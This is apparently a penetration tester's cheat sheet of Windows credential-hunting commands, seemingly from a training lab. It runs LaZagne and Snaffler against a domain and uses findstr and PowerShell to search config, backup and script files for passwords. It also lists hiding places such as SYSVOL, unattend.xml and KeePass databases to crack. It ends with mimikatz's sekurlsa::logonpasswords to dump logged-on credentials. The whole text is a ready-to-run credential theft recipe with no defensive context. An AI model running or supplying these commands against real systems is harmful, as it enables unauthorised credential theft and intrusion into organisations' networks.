# Web browser & third-party credentials hunting 
#### Lazagne tool 
```
.\lazagne.exe all
```
#### Snaffler tool 
```
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
# Build-In utilities 
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.bak *.backup *.conf *.kdbx
```
```
cmd /c for %E in (txt ini cfg config xml git ps1 yml bak backup conf kdbx) do @findstr /SIM /C:"password" *.%E
```
								OR
```
"txt","ini","cfg","config","xml","git","ps1","yml","bak","backup","conf","kdbx" | ForEach-Object { Get-ChildItem -Recurse -Filter "*.$_" -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive:$false -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path -Unique }
```
# Manual credentials hunting 
- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share 
- Password in scripts on IT shares 
- Passwords in `web.config` files on dev machines and IT shares 
- unattend.xml
- Passwords in the AD user or computer description fields 
- KeePass databases --> pull hash, crack and get loads of access. 
- Found on user systems and shares 
- Files such as `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)


# Get all saved credentials
```
mimikatz.exe
```
```
sekurlsa::logonpasswords
```
